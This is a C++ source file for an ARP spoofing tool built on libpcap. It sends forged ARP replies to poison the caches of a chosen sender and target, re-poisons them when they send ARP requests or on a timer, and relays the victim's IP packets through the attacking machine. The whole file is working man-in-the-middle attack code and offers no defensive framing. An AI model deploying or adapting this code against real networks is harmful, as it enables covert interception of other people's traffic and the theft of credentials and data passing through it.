#include <iostream>
#include <boost/thread.hpp>
#include "../../includes/arpspoof/ArpSpoof.h"
#include "../../includes/network/packet/ArpPacket.h"
#include "../../includes/network/packet/IpPacket.h"

using namespace network;

namespace arpspoof {

    void ArpSpoof::send_arp(pcap *desc, int cnt, uint16_t op) {
        ArpPacket pk(op, my.first, session.target.second, session.sender.first, session.sender.second);

        while (cnt--) {
            std::cout << "sent arp packet: " << session.sender.second << std::endl;
            if (pcap_sendpacket(desc, pk.to_bytes().data(), ArpPacket::size) != 0) {
                throw std::runtime_error("Error sending the packet : " + std::string(pcap_geterr(desc)));
            }
            boost::this_thread::sleep_for(boost::chrono::seconds(1));
        }
    }

    void ArpSpoof::spoof() {
        pcap *desc = open_dev(device.c_str());

        send_arp(desc, 3);

        auto *filter = new bpf_program;
        if (pcap_compile(desc, filter, "arp", 1, 0) == -1 and pcap_setfilter(desc, filter) == -1) {
            std::cerr << "error: " << pcap_geterr(desc) << std::endl;
            exit(-1);
        }
        delete filter;

        const byte *packet = new byte[8192];
        pcap_pkthdr *header;
        int res = 0;
        while ((res = pcap_next_ex(desc, &header, &packet)) >= 0) {
            if (res == 0) continue;
            ArpPacket pk(packet);

            if (pk.arp.opcode == ARPOP_REQUEST) {
                if (pk.arp.sender_mac == session.target.first and pk.arp.target_ip == session.sender.second) {
                    send_arp(desc, 3, ARPOP_REQUEST);
                }
                if (pk.arp.sender_mac == session.sender.first and pk.arp.target_ip == session.target.second) {
                    send_arp(desc, 3, ARPOP_REPLY);
                }
            }
        }
    }

    void ArpSpoof::spoof_periodic(uint32_t period) {
        pcap *desc = open_dev(device.c_str());

        while (true) {
            try {
                send_arp(desc);
                boost::this_thread::sleep_for(boost::chrono::seconds(period));
            } catch (const std::runtime_error &ex) {
                std::cerr << ex.what() << std::endl;
                break;
            }
        }
        pcap_close(desc);
    }

    void ArpSpoof::spoofed_relay() {
        pcap *desc = open_dev(device.c_str());

        const byte *packet = new byte[1024];
        pcap_pkthdr *header;
        int res = 0;
        while ((res = pcap_next_ex(desc, &header, &packet)) >= 0) {
            if (res == 0) continue;
            IpPacket pk(packet);

            if (pk.eth.type == ETHERTYPE_IP) {
                if (pk.eth.src == session.sender.first and pk.eth.dst == my.first) {
                    if (pk.eth.src == session.sender.first and pk.ip.dst != my.second) {
                        pk.eth.src = my.first;
                        pk.eth.dst = session.target.first;

                        std::cout << pk.ip.src << " -> " << pk.ip.dst << std::endl;
                        if (pcap_sendpacket(desc, pk.to_bytes().data(), pk.size()) != 0) {
                            throw std::runtime_error("Error sending the packet : " + std::string(pcap_geterr(desc)));
                        }
                    }
                }
            }
        }
        pcap_close(desc);
    }
}